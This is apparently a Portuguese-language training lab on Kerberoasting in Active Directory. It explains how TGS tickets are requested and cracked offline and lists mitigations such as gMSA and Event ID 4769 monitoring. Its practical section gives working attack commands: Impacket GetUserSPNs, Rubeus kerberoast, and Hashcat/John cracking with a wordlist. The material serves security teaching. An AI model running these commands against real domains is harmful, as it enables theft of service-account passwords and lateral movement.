# Identificação de SPNs e Ataque Kerberoasting

### 📖 Introdução Teórica
O **Kerberoasting** (catalogado na matriz MITRE ATT&CK como técnica **T1558.003**) é um dos ataques de escalação de privilégios e movimentação lateral mais prevalentes e perigosos no ecossistema do Microsoft Active Directory.

**O Protocolo Kerberos v5 e a Concessão de Bilhetes:**
Para permitir que colaboradores acessem serviços corporativos (como instâncias Microsoft SQL Server, portais intranet IIS ou compartilhamentos de arquivos) sem transmitir senhas pela rede, o Active Directory utiliza bilhetes criptográficos:
1. O usuário se autentica com sua senha no Key Distribution Center (KDC) do Domain Controller e recebe um Ticket Granting Ticket (TGT).
2. Quando o usuário deseja interagir com um serviço de rede, ele envia uma solicitação de bilhete de serviço (**TGS-REQ**) ao KDC informando o **Service Principal Name (SPN)** do alvo (ex: `MSSQLSvc/sql01.corp.local:1433`).
3. O KDC responde (**TGS-REP**) fornecendo o bilhete **Ticket Granting Service (TGS)**.

**A Falha Estrutural e a Superfície de Abuso:**
* **Qualquer usuário válido do domínio**, mesmo a conta mais humilde e restrita (como um estagiário ou terceiro temporário), tem autorização pelo protocolo para solicitar um bilhete TGS para **QUALQUER conta de serviço** que tenha um SPN registrado.
* O KDC **não verifica** se o usuário possui permissão real para usar aquele serviço antes de emitir o bilhete!
* O bilhete TGS retornado é **criptografado utilizando o hash NTLM da conta de usuário do Active Directory que executa o serviço**.

**Por que o Ataque é 100% Offline e Furtivo?**
O atacante **não precisa se conectar ao servidor do serviço real**:
* O bilhete TGS chega na memória da máquina do atacante.
* O atacante extrai o ticket cifrado e o submete a um ataque de dicionário ou força bruta **totalmente offline** em seu próprio computador (utilizando Hashcat com GPUs ou John the Ripper).
* **Nenhum log de bloqueio de conta (`badPwdCount`) é gerado no Domain Controller**, pois o DC nunca sabe que bilhões de senhas estão sendo testadas localmente contra o ticket!
* Como contas de serviço frequentemente usam senhas fracas que nunca expiram (para evitar a interrupção de sistemas legados), a senha em texto claro é descoberta rapidamente.

**Mitigações Canônicas:**
* Adoção mandatória de **Contas de Serviço Gerenciadas por Grupo (gMSA - Group Managed Service Accounts)**: suas senhas possuem 128 caracteres aleatórios e são rotacionadas automaticamente pelo Windows, tornando o cracking offline matematicamente impossível.
* Para contas legadas que não suportam gMSA, exigir senhas com comprimento superior a 25 caracteres aleatórios e monitorar requisições em massa de TGS com cifra RC4 (Event ID 4769).

### 💻 Exemplos Práticos e Sintaxe
1. **Requisitar Bilhetes TGS no Linux com a suíte Impacket (`GetUserSPNs.py`):**
   ```bash
   # Requisita tickets TGS de todas as contas com SPN e salva em formato do Hashcat/John:
   GetUserSPNs.py corp.local/usuario_comum:Senha123      -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
   ```

2. **Formato do Hash TGS Extraído (Kerberos 5 etype 23):**
   ```text
   $krb5tgs$23$*srv_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$1a2b3c4d5e...
   ```

3. **Quebra Offline com Hashcat (Modo 13100):**
   ```bash
   hashcat -m 13100 -a 0 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
   ```
   *A flag `-m 13100` instrui o Hashcat a decodificar tickets Kerberos 5 TGS-REP.*

4. **Quebra Offline com John the Ripper:**
   ```bash
   john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
   john --show --format=krb5tgs tgs_hashes.txt
   ```

5. **Requisitar Tickets no Windows com Rubeus:**
   ```powershell
   .\Rubeus.exe kerberoast /outfile:tgs_hashes.txt
   ```

### 🎯 Seu Objetivo

Compreender e explorar a técnica de Kerberoasting contra o protocolo Kerberos. Seu objetivo é identificar contas de serviço vinculadas a Service Principal Names (SPNs), solicitar e extrair o ticket de serviço TGS criptografado e realizar a quebra de senha offline desse ticket para recuperar a senha em texto claro da conta de serviço.
